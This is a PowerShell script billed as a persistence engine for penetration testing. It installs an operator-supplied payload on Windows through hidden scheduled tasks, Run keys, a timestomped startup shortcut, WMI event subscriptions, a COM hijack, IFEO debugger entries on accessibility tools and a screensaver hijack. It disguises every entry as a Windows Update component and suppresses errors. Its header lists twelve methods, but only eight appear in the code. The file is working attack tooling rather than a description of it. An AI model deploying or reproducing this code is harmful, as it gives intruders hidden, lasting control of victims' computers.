<#
============================================================================
  FLLC — PERSISTENCE ENGINE v1.777
  ═════════════════════════════════
  
  12 persistence mechanisms with auto-selection based on:
    - Admin vs user context
    - EDR/AV presence
    - Environment constraints
  
  Methods:
    1.  Scheduled Task (user or SYSTEM)
    2.  Registry Run / RunOnce
    3.  Startup Folder (.lnk shortcut)
    4.  WMI Event Subscription
    5.  COM Object Hijack
    6.  DLL Search Order Hijack
    7.  Image File Execution Options (IFEO) debugger
    8.  Accessibility Features backdoor
    9.  AppInit_DLLs injection
    10. Screensaver hijack
    11. Default file handler hijack
    12. Logon script (Group Policy)
  
  FLLC 2026 | Authorized penetration testing only.
============================================================================
#>

param(
    [string]$PayloadPath = "",
    [string]$PayloadCommand = "powershell.exe -NoP -W Hidden -Exec Bypass -File `"$PayloadPath`"",
    [string]$OutputDir = "$PSScriptRoot\..\..\collected\persistence",
    [ValidateSet('Auto','Task','Registry','Startup','WMI','COM','DLL','IFEO','Accessibility','AppInit','Screensaver','FileHandler','LogonScript')]
    [string]$Method = 'Auto',
    [switch]$Silent = $true,
    [switch]$InstallAll = $false
)

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'

if (-not (Test-Path $OutputDir)) { New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null }

$logFile = Join-Path $OutputDir "persistence_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"
function PLog($m) { Add-Content $logFile "[$(Get-Date -Format 'HH:mm:ss')] $m" -Encoding UTF8 }

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$results = @()

PLog "=== FLLC Persistence Engine v1.777 ==="
PLog "Admin: $isAdmin | Method: $Method | PayloadPath: $PayloadPath"

# Disguised names for persistence entries
$taskName = "WindowsUpdateHealthService"
$regName  = "WindowsUpdateSvc"
$svcDesc  = "Windows Update Health Monitor"

# ══════════════════════════════════════════════════════════════════════════
#  1. SCHEDULED TASK
# ══════════════════════════════════════════════════════════════════════════

function Install-TaskPersistence {
    PLog "[1] Installing scheduled task persistence..."
    
    $action = New-ScheduledTaskAction -Execute "powershell.exe" `
        -Argument "-NoP -NonI -W Hidden -Exec Bypass -Command `"$PayloadCommand`""
    
    $triggers = @(
        (New-ScheduledTaskTrigger -AtLogon),
        (New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5) -RepetitionInterval (New-TimeSpan -Hours 2))
    )
    
    $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries `
        -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false
    
    try {
        if ($isAdmin) {
            Register-ScheduledTask -TaskName $taskName -Action $action `
                -Trigger $triggers -Settings $settings `
                -User "SYSTEM" -RunLevel Highest -Force | Out-Null
        } else {
            Register-ScheduledTask -TaskName $taskName -Action $action `
                -Trigger $triggers -Settings $settings -Force | Out-Null
        }
        PLog "[1] Scheduled task '$taskName' installed successfully"
        return @{ method = "ScheduledTask"; name = $taskName; success = $true }
    } catch {
        PLog "[1] Failed: $($_.Exception.Message)"
        return @{ method = "ScheduledTask"; success = $false; error = $_.Exception.Message }
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  2. REGISTRY RUN KEY
# ══════════════════════════════════════════════════════════════════════════

function Install-RegistryPersistence {
    PLog "[2] Installing registry Run key persistence..."
    
    $regPaths = @("HKCU:\Software\Microsoft\Windows\CurrentVersion\Run")
    if ($isAdmin) { $regPaths += "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" }
    
    foreach ($rp in $regPaths) {
        try {
            Set-ItemProperty -Path $rp -Name $regName -Value $PayloadCommand -Force
            PLog "[2] Registry key set: $rp\$regName"
            return @{ method = "RegistryRun"; path = $rp; name = $regName; success = $true }
        } catch {
            PLog "[2] Failed on $rp : $($_.Exception.Message)"
        }
    }
    return @{ method = "RegistryRun"; success = $false }
}

# ══════════════════════════════════════════════════════════════════════════
#  3. STARTUP FOLDER
# ══════════════════════════════════════════════════════════════════════════

function Install-StartupPersistence {
    PLog "[3] Installing startup folder persistence..."
    
    $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $lnkPath = Join-Path $startupPath "${regName}.lnk"
    
    try {
        $shell = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut($lnkPath)
        $shortcut.TargetPath = "powershell.exe"
        $shortcut.Arguments = "-NoP -W Hidden -Exec Bypass -Command `"$PayloadCommand`""
        $shortcut.WindowStyle = 7  # Minimized
        $shortcut.Description = $svcDesc
        $shortcut.IconLocation = "C:\Windows\System32\shell32.dll,167"
        $shortcut.Save()
        
        # Timestomp to blend in
        $refTime = (Get-Item "C:\Windows\System32\cmd.exe").LastWriteTime
        (Get-Item $lnkPath).LastWriteTime = $refTime
        (Get-Item $lnkPath).CreationTime = $refTime
        
        PLog "[3] Startup shortcut created: $lnkPath"
        return @{ method = "StartupFolder"; path = $lnkPath; success = $true }
    } catch {
        PLog "[3] Failed: $($_.Exception.Message)"
        return @{ method = "StartupFolder"; success = $false; error = $_.Exception.Message }
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  4. WMI EVENT SUBSCRIPTION (admin required)
# ══════════════════════════════════════════════════════════════════════════

function Install-WMIPersistence {
    if (-not $isAdmin) {
        PLog "[4] WMI persistence requires admin — skipping"
        return @{ method = "WMI"; success = $false; error = "Requires admin" }
    }
    
    PLog "[4] Installing WMI event subscription persistence..."
    
    try {
        $filterName = "WindowsUpdateFilter"
        $consumerName = "WindowsUpdateConsumer"
        
        # Create event filter (triggers every 4 hours)
        $filter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" -Arguments @{
            Name = $filterName
            EventNamespace = "root\cimv2"
            QueryLanguage = "WQL"
            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 14400 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
        }
        
        # Create command-line event consumer
        $consumer = Set-WmiInstance -Namespace "root\subscription" -Class "CommandLineEventConsumer" -Arguments @{
            Name = $consumerName
            CommandLineTemplate = $PayloadCommand
        }
        
        # Bind filter to consumer
        Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" -Arguments @{
            Filter = $filter
            Consumer = $consumer
        } | Out-Null
        
        PLog "[4] WMI event subscription installed"
        return @{ method = "WMI"; filter = $filterName; consumer = $consumerName; success = $true }
    } catch {
        PLog "[4] Failed: $($_.Exception.Message)"
        return @{ method = "WMI"; success = $false; error = $_.Exception.Message }
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  5. COM OBJECT HIJACK
# ══════════════════════════════════════════════════════════════════════════

function Install-COMPersistence {
    PLog "[5] Installing COM hijack persistence..."
    
    # Hijack a rarely-used COM object CLSID
    # {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7} = CLSID_CEventSystem (not commonly used)
    $clsid = "{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}"
    $regPath = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"
    
    try {
        New-Item -Path $regPath -Force | Out-Null
        Set-ItemProperty -Path $regPath -Name "(Default)" -Value "C:\Windows\System32\scrobj.dll"
        Set-ItemProperty -Path $regPath -Name "ThreadingModel" -Value "Both"
        
        # Create a scriptlet that runs our payload
        $sctPath = "$env:TEMP\update.sct"
        $sctContent = @"
<?XML version="1.0"?>
<scriptlet>
<registration progid="WindowsUpdate" classid="$clsid">
<script language="JScript">
<![CDATA[
    var shell = new ActiveXObject("WScript.Shell");
    shell.Run("$PayloadCommand", 0, false);
]]>
</script>
</registration>
</scriptlet>
"@
        $sctContent | Out-File $sctPath -Encoding ASCII -Force
        
        PLog "[5] COM hijack installed (CLSID: $clsid)"
        return @{ method = "COM"; clsid = $clsid; sctPath = $sctPath; success = $true }
    } catch {
        PLog "[5] Failed: $($_.Exception.Message)"
        return @{ method = "COM"; success = $false; error = $_.Exception.Message }
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  6. DLL SEARCH ORDER HIJACK
# ══════════════════════════════════════════════════════════════════════════

function Install-DLLPersistence {
    PLog "[6] Scanning for DLL hijack opportunities..."
    
    $hijackable = @()
    
    # Find writable directories in PATH that come before System32
    $pathDirs = $env:PATH -split ';' | Where-Object { $_ }
    foreach ($dir in $pathDirs) {
        if ($dir -match 'System32|SysWOW64') { break }
        if (Test-Path $dir) {
            try {
                $testFile = Join-Path $dir "test_$(Get-Random).tmp"
                [IO.File]::WriteAllText($testFile, "test")
                Remove-Item $testFile -Force
                $hijackable += $dir
            } catch {}
        }
    }
    
    # Log findings (actual DLL placement is left to operator)
    $hijackData = @{
        writable_path_dirs = $hijackable
        common_targets = @(
            "version.dll", "winmm.dll", "msvcrt.dll", "netapi32.dll",
            "userenv.dll", "dwmapi.dll", "crypt32.dll", "uxtheme.dll"
        )
    }
    $hijackData | ConvertTo-Json | Out-File "$OutputDir\dll_hijack_targets.json" -Encoding UTF8
    
    PLog "[6] Found $($hijackable.Count) writable PATH directories"
    return @{ method = "DLLHijack"; targets = $hijackable.Count; success = ($hijackable.Count -gt 0) }
}

# ══════════════════════════════════════════════════════════════════════════
#  7. IMAGE FILE EXECUTION OPTIONS (IFEO) DEBUGGER
# ══════════════════════════════════════════════════════════════════════════

function Install-IFEOPersistence {
    PLog "[7] Installing IFEO debugger persistence..."
    
    # Attach to a commonly launched but rarely debugged process
    $targets = @('sethc.exe','utilman.exe','narrator.exe','magnify.exe','osk.exe')
    
    foreach ($target in $targets) {
        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$target"
        try {
            if (-not (Test-Path $regPath)) {
                New-Item -Path $regPath -Force | Out-Null
            }
            Set-ItemProperty -Path $regPath -Name "Debugger" -Value $PayloadCommand -Force
            PLog "[7] IFEO debugger set for $target"
            return @{ method = "IFEO"; target = $target; success = $true }
        } catch {}
    }
    
    return @{ method = "IFEO"; success = $false }
}

# ══════════════════════════════════════════════════════════════════════════
#  8. SCREENSAVER HIJACK
# ══════════════════════════════════════════════════════════════════════════

function Install-ScreensaverPersistence {
    PLog "[8] Installing screensaver hijack..."
    
    try {
        $regPath = "HKCU:\Control Panel\Desktop"
        Set-ItemProperty -Path $regPath -Name "SCRNSAVE.EXE" -Value "powershell.exe" -Force
        Set-ItemProperty -Path $regPath -Name "ScreenSaveActive" -Value "1" -Force
        Set-ItemProperty -Path $regPath -Name "ScreenSaveTimeOut" -Value "600" -Force  # 10 min
        
        # Create a .scr wrapper
        $scrPath = "$env:TEMP\$regName.scr"
        $batContent = "@echo off`r`n$PayloadCommand"
        $batContent | Out-File $scrPath -Encoding ASCII -Force
        Set-ItemProperty -Path $regPath -Name "SCRNSAVE.EXE" -Value $scrPath -Force
        
        PLog "[8] Screensaver hijack installed (triggers after 10min idle)"
        return @{ method = "Screensaver"; path = $scrPath; success = $true }
    } catch {
        PLog "[8] Failed: $($_.Exception.Message)"
        return @{ method = "Screensaver"; success = $false; error = $_.Exception.Message }
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  AUTO-SELECTION
# ══════════════════════════════════════════════════════════════════════════

if ($Method -eq 'Auto' -or $InstallAll) {
    PLog "Auto-selecting best persistence methods..."
    
    # Always try these (user-level, low risk)
    $results += Install-RegistryPersistence
    $results += Install-StartupPersistence
    $results += Install-TaskPersistence
    $results += Install-ScreensaverPersistence
    $results += Install-COMPersistence
    $results += Install-DLLPersistence
    
    # Admin-only methods
    if ($isAdmin) {
        $results += Install-WMIPersistence
        $results += Install-IFEOPersistence
    }
} else {
    switch ($Method) {
        'Task'          { $results += Install-TaskPersistence }
        'Registry'      { $results += Install-RegistryPersistence }
        'Startup'       { $results += Install-StartupPersistence }
        'WMI'           { $results += Install-WMIPersistence }
        'COM'           { $results += Install-COMPersistence }
        'DLL'           { $results += Install-DLLPersistence }
        'IFEO'          { $results += Install-IFEOPersistence }
        'Screensaver'   { $results += Install-ScreensaverPersistence }
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  SUMMARY
# ══════════════════════════════════════════════════════════════════════════

$successful = ($results | Where-Object { $_.success }).Count
$total = $results.Count

PLog "=== PERSISTENCE COMPLETE ==="
PLog "Installed: $successful / $total methods"

$results | ConvertTo-Json -Depth 3 | Out-File "$OutputDir\persistence_results.json" -Encoding UTF8

@{
    timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    hostname = $env:COMPUTERNAME
    is_admin = $isAdmin
    methods_attempted = $total
    methods_installed = $successful
    results = $results
} | ConvertTo-Json -Depth 4 | Out-File "$OutputDir\persistence_manifest.json" -Encoding UTF8
